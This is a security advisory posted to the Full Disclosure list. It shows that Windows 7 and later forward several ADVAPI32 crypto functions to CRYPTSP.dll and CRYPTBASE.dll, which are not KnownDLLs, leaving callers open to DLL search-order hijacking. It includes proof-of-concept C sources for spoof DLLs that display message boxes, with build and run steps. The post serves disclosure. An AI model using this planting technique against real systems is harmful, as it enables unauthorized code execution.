@@ -1,0 +1,375 @@
+
+Date: Tue, 15 Dec 2020 22:00:02 +0100
+From: "Stefan Kanthak" <stefan.kanthak@...go.de>
+To: <fulldisclosure@...lists.org>
+Cc: bugtraq@...urityfocus.com
+Subject: [FD] Defense in depth -- the Microsoft way (part 68): where
+	compatibility means vulnerability
+
+Hi @ll,
+
+this post is a shortened version of
+<https://skanthak.homepage.t-online.de/detour.html>
+
+With Windows 2000 and Windows XP, Microsoft introduced the functions
+SystemFunction035() alias RtlCheckSignatureInFile(),
+SystemFunction036() alias RtlGenRandom(),
+SystemFunction040() alias RtlEncryptMemory(), and
+SystemFunction041() alias RtlDecryptMemory() in ADVAPI32.dll
+
+Note: RtlCheckSignatureInFile() was never documented, it has the
+      following prototype:
+
+| #define RtlCheckSignatureInFile SystemFunction035
+|
+| __declspec(dllimport)
+| BOOL WINAPI RtlCheckSignatureInFile(LPCWSTR Filename);
+
+Note: the import library ADVAPIP.lib shipped with the Windows Driver
+      Development Kit provides the stub for SystemFunction035.
+
+
+<https://msdn.microsoft.com/en-us/library/aa387694.aspx>
+
+| The RtlGenRandom function generates a pseudo-random number.
+|
+| Note  This function has no associated import library. This function
+| is available as a resource named SystemFunction036 in Advapi32.dll.
+| You must use the LoadLibrary and GetProcAddress functions to dynamically
+| link to Advapi32.dll.
+|
+|
+| Syntax
+|
+| BOOLEAN RtlGenRandom(
+|   PVOID RandomBuffer,
+|   ULONG RandomBufferLength)
+
+
+<https://msdn.microsoft.com/en-us/library/aa387692.aspx>
+
+| The RtlDecryptMemory function decrypts memory contents previously
+| encrypted by the RtlEncryptMemory function.
+|
+| Note  This function has no associated import library. This function
+| is available as a resource named SystemFunction041 in Advapi32.dll.
+| You must use the LoadLibrary and GetProcAddress functions to dynamically
+| link to Advapi32.dll.
+|
+|
+| Syntax
+|
+| NTSTATUS RtlDecryptMemory(
+|   PVOID Memory,
+|   ULONG MemorySize,
+|   ULONG OptionFlags)
+
+
+<https://msdn.microsoft.com/en-us/library/aa387693.aspx>
+
+| The RtlEncryptMemory function encrypts memory contents.The encrypted
+| contents can be decrypted by a subsequent call to the RtlDecryptMemory
+| function.
+|
+| Note  This function has no associated import library. This function
+| is available as a resource named SystemFunction040 in Advapi32.dll.
+| You must use the LoadLibrary and GetProcAddress functions to dynamically
+| link to Advapi32.dll.
+|
+|
+| Syntax
+|
+| NTSTATUS RtlEncryptMemory(
+|   PVOID Memory,
+|   ULONG MemorySize,
+|   ULONG OptionFlags)
+
+
+The statements "This function has no associated import library" are but
+wrong: the import library ADVAPI32.lib shipped with the Windows Software
+Development Kit for Windows Server 2003 SP1 and later versions provides
+stubs for SystemFunction036, SystemFunction040 and SystemFunction041!
+
+Since ADVAPI32.dll is one of the so-called "KnownDLLs", these 4 functions
+were safe to use on Windows 2000 and Windows XP and didn't allow DLL
+spoofing/hijacking there.
+
+<https://msdn.microsoft.com/en-us/library/ms682586.aspx>
+
+| * If the DLL is on the list of known DLLs for the version of Windows on
+|   which the application is running, the system uses its copy of the
+|   known DLL (and the known DLL's dependent DLLs, if any) instead of
+|   searching for the DLL. For a list of known DLLs on the current system,
+|   see the following registry key:
+|   HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs.
+
+
+With Windows 7, the implementations of these 4 functions were moved to
+CRYTPSP.dll and CRYPTBASE.dll respectively: SystemFunction035 is now
+forwarded to CRYPTSP.CheckSignatureInFile, while the stubs for
+SystemFunction036, SystemFunction040 and SystemFunction041 remaining in
+ADVAPI32.dll load CRYPTBASE.dll via LoadLibrary(), retrieve the target
+address via GetProcAddress(), call it, and finally unload CRYPTBASE.dll
+via FreeLibrary().
+
+With Windows 8.1, the 3 stubs were replaced with forwarders to CRYPTBASE.dll
+
+
+Since neither CRYPTSP.dll nor CRYPTBASE.dll are "KnownDLLs", this change
+made the use of these 4 functions vulnerable to
+- CWE-426: Untrusted Search Path
+  <https://cwe.mitre.org/data/definitions/426.html>
+- CWE-427: Uncontrolled Search Path Element
+  <https://cwe.mitre.org/data/definitions/427.html>
+- CAPEC-471: Search Order Hijacking
+  <https://capec.mitre.org/data/definitions/471.html>
+
+
+Demonstration
+~~~~~~~~~~~~~
+
+1. Save the following sources as CRYPTSP.c and CRYPTBASE.c respectively:
+
+--- CRYPTSP.c ---
+#define STRICT
+#define WIN32_LEAN_AND_MEAN
+
+#include <windows.h>
+
+#ifndef DLL
+#define RtlCheckSignatureInFile SystemFunction035
+
+__declspec(dllimport)
+BOOL WINAPI RtlCheckSignatureInFile(LPCWSTR Filename);
+
+__declspec(noreturn)
+VOID WINAPI MainCRTStartup(VOID)
+{
+    ExitProcess(RtlCheckSignatureInFile(L"C:\\Windows\\Explorer.exe") ? ERROR_SUCCESS : GetLastError());
+}
+#else
+extern const IMAGE_DOS_HEADER __ImageBase;
+
+const LPCSTR szReason[4] = {"DLL_PROCESS_DETACH\n",
+                            "DLL_PROCESS_ATTACH\n",
+                            "DLL_THREAD_ATTACH\n",
+                            "DLL_THREAD_DETACH\n"};
+
+BOOL WINAPI _DllMainCRTStartup(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
+{
+    LPCSTR           szModule = "<unknown>";
+    IMAGE_NT_HEADERS *ntHeader = (IMAGE_NT_HEADERS *) ((LPBYTE) &__ImageBase + __ImageBase.e_lfanew);
+    DWORD            dwRVA = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    DWORD            dwSize = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
+
+    if ((dwRVA != 0UL) && (dwSize >= sizeof(IMAGE_EXPORT_DIRECTORY)))
+    {
+        dwRVA = ((IMAGE_EXPORT_DIRECTORY *) ((LPBYTE) &__ImageBase + dwRVA))->Name;
+        if (dwRVA != 0UL)
+            szModule = (LPCSTR) ((LPBYTE) &__ImageBase + dwRVA);
+    }
+
+    return IDOK == MessageBoxExA(HWND_DESKTOP,
+                                 szReason[dwReason],
+                                 szModule,
+                                 dwReason == DLL_PROCESS_ATTACH ? MB_OKCANCEL : MB_OK,
+                                 MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT));
+}
+
+__declspec(dllexport)
+BOOL WINAPI CheckSignatureInFile(LPCWSTR Filename)
+{
+    SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
+
+    return FALSE;
+}
+#endif // DLL
+--- EOF ---
+
+--- CRYPTBASE.c ---
+#define STRICT
+#define WIN32_LEAN_AND_MEAN
+
+#include <windows.h>
+
+#ifndef LOAD_LIBRARY_SEARCH_SYSTEM32_NO_FORWARDER
+#define LOAD_LIBRARY_SEARCH_SYSTEM32_NO_FORWARDER 0x00004000UL
+#endif
+
+#ifndef DLL
+#define RtlGenRandom SystemFunction036
+
+__declspec(dllimport)
+BOOLEAN WINAPI RtlGenRandom(LPVOID Buffer, DWORD Size);
+
+#define RtlEncryptMemory SystemFunction040
+
+__declspec(dllimport)
+LONG WINAPI RtlEncryptMemory(LPVOID Memory, DWORD Size, DWORD Flags);
+
+#define RtlDecryptMemory SystemFunction041
+
+__declspec(dllimport)
+LONG WINAPI RtlDecryptMemory(LPVOID Memory, DWORD Size, DWORD Flags);
+
+__declspec(noreturn)
+VOID WINAPI MainCRTStartup(VOID)
+{
+    CHAR cbBuffer[32];
+    DWORD dwError = ERROR_SUCCESS;
+
+    if (!SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32))
+        dwError = GetLastError();
+
+    RtlGenRandom(cbBuffer, sizeof(cbBuffer));
+    RtlEncryptMemory(cbBuffer, sizeof(cbBuffer), 0UL);
+    RtlDecryptMemory(cbBuffer, sizeof(cbBuffer), 0UL);
+
+    ExitProcess(dwError);
+}
+
+#ifndef _WIN64
+extern BYTE __safe_se_handler_count;
+extern LPVOID __safe_se_handler_table[];
+
+DWORD_PTR __security_cookie = 3141592654UL;
+
+const IMAGE_LOAD_CONFIG_DIRECTORY32 _load_config_used = {sizeof(_load_config_used),
+                                                        'DEMO',
+                                                         _MSC_VER / 100, _MSC_VER % 100,
+                                                         0UL, 0UL, 0UL, 0UL, 0UL, 0UL, 0UL, 0UL, 0UL, 0UL,
+                                                         0U,
+                                                         LOAD_LIBRARY_SEARCH_SYSTEM32_NO_FORWARDER,
+                                                         0UL,
+                                                         &__security_cookie,
+                                                         __safe_se_handler_table,
+                                                         &__safe_se_handler_count,
+                                                         0UL, 0UL, 0UL, 0UL, 0UL};
+#else
+DWORD_PTR __security_cookie = 3141592653589793241ULL >> 16;
+
+const IMAGE_LOAD_CONFIG_DIRECTORY64 _load_config_used = {sizeof(_load_config_used),
+                                                         'DEMO',
+                                                         _MSC_VER / 100, _MSC_VER % 100,
+                                                         0UL, 0UL, 0UL,
+                                                         0ULL, 0ULL, 0ULL, 0ULL, 0ULL, 0ULL,
+                                                         0UL,
+                                                         0U,
+                                                         LOAD_LIBRARY_SEARCH_SYSTEM32_NO_FORWARDER,
+                                                         0ULL,
+                                                         &__security_cookie,
+                                                         0ULL, 0ULL, 0ULL, 0ULL, 0ULL, 0ULL,
+                                                         0UL};
+#endif // _WIN64
+#else
+#define STATUS_NOT_IMPLEMENTED 0xC0000002L
+
+extern const IMAGE_DOS_HEADER __ImageBase;
+
+const LPCSTR szReason[4] = {"DLL_PROCESS_DETACH\n",
+                            "DLL_PROCESS_ATTACH\n",
+                            "DLL_THREAD_ATTACH\n",
+                            "DLL_THREAD_DETACH\n"};
+
+BOOL WINAPI _DllMainCRTStartup(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
+{
+    LPCSTR           szModule = "<unknown>";
+    IMAGE_NT_HEADERS *ntHeader = (IMAGE_NT_HEADERS *) ((LPBYTE) &__ImageBase + __ImageBase.e_lfanew);
+    DWORD            dwRVA = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    DWORD            dwSize = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
+
+    if ((dwRVA != 0UL) && (dwSize >= sizeof(IMAGE_EXPORT_DIRECTORY)))
+    {
+        dwRVA = ((IMAGE_EXPORT_DIRECTORY *) ((LPBYTE) &__ImageBase + dwRVA))->Name;
+        if (dwRVA != 0UL)
+            szModule = (LPCSTR) ((LPBYTE) &__ImageBase + dwRVA);
+    }
+
+    return IDOK == MessageBoxExA(HWND_DESKTOP,
+                                 szReason[dwReason],
+                                 szModule,
+                                 dwReason == DLL_PROCESS_ATTACH ? MB_OKCANCEL : MB_OK,
+                                 MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT));
+}
+
+__declspec(dllexport)
+BOOLEAN WINAPI SystemFunction036(LPVOID Buffer, DWORD Length)
+{
+    return FALSE;
+}
+
+__declspec(dllexport)
+LONG WINAPI SystemFunction040(LPVOID Buffer, DWORD Length, DWORD Flags)
+{
+    return STATUS_NOT_IMPLEMENTED;
+}
+
+__declspec(dllexport)
+LONG WINAPI SystemFunction041(LPVOID Buffer, DWORD Length, DWORD Flags)
+{
+    return STATUS_NOT_IMPLEMENTED;
+}
+#endif // DLL
+--- EOF ---
+
+
+2. Build CRYPTSP.exe and CRYPTBASE.exe with the following command lines:
+
+   CL.exe /Zl /W4 /Ox /GAF /c CRYPTSP.c
+   LINK.exe /DYNAMICBASE /ENTRY:MainCRTStartup /NODEFAULTLIB /NXCOMPAT /RELEASE /SUBSYSTEM:Console CRYPTSP.obj ADVAPIP.lib
+KERNEL32.lib
+   CL.exe /Zl /W4 /Ox /GAF /c CRYPTBASE.c
+   LINK.exe /DEPENDENTLOADFLAG:0x4000 /DYNAMICBASE /ENTRY:MainCRTStartup /NODEFAULTLIB /NXCOMPAT /RELEASE /SUBSYSTEM:CONSOLE
+CRYPTBASE.obj ADVAPI32.lib KERNEL32.lib
+
+
+3. Execute CRYPTSP.exe and CRYPTBASE.exe, then display their exit codes:
+
+   .\CRYPTSP.exe
+   ECHO %ERRORLEVEL%
+   .\CRYPTBASE.exe
+   ECHO %ERRORLEVEL%
+
+   Since C:\Windows\Explorer.exe contains no authenticode signature
+   -- its signature is provided in a catalog file -- CRYPTSP.exe returns
+   1813 alias ERROR_RESOURCE_TYPE_NOT_FOUND, while CRYPTBASE.exe returns
+   0
+
+
+4. Build CRYPTSP.dll and CRYPTBASE.dll with the following command lines:
+
+   CL.exe /Zl /W4 /Ox /GAF /DDLL /c CRYPTSP.c
+   LINK.exe /DLL /DYNAMICBASE /ENTRY:_DllMainCRTStartup /EXPORT:CheckSignatureInFile /NODEFAULTLIB /NXCOMPAT /RELEASE
+/SUBSYSTEM:WINDOWS CRYPTSP.obj KERNEL32.lib USER32.lib
+   CL.exe /Zl /W4 /Ox /GAF /DDLL /c CRYPTBASE.c
+   LINK.exe /DLL /DYNAMICBASE /ENTRY:_DllMainCRTStartup /EXPORT:SystemFunction036 /EXPORT:SystemFunction040
+/EXPORT:SystemFunction041 /NODEFAULTLIB /NXCOMPAT /RELEASE /SUBSYSTEM:Windows CRYPTBASE.obj USER32.lib
+
+
+5. Repeat step 2, and notice the message boxes displayed from CRYPTSP.dll
+   and CRYPTBASE.dll
+
+
+stay tuned, and far away from vulnerable functions of the Windows API
+Stefan Kanthak
+
+Timeline:
+~~~~~~~~~
+
+2020-11-26    Vulnerability report sent to vendor
+
+2020-11-26    Automated reply
+
+2020-12-03    MSRC case 52299 opened
+
+2020-12-14    MSRC case 52299 closed:
+              "We determined your finding does not meet our bar for immediate
+               servicing because KnownDlls is a performance--not security--feature."
+
+2020-12-15    Report published
+
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
